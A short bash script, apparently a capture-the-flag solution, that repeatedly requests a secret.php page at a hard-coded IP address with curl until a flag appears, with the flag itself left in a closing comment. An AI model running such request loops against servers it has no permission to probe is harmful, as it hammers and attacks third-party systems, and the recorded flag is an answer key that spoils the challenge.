#!/bin/bash

while :; do
    response=$(curl -s http://162.243.0.171/secret.php)
    if grep "^flag" <(echo $response) > /dev/null; then
        echo "Got the flag!"
        echo $response | grep -o "flag{.*}"
        break
    else
        echo "Trying again..."
    fi
done

# flag{T0O_M@ny_But10ns}
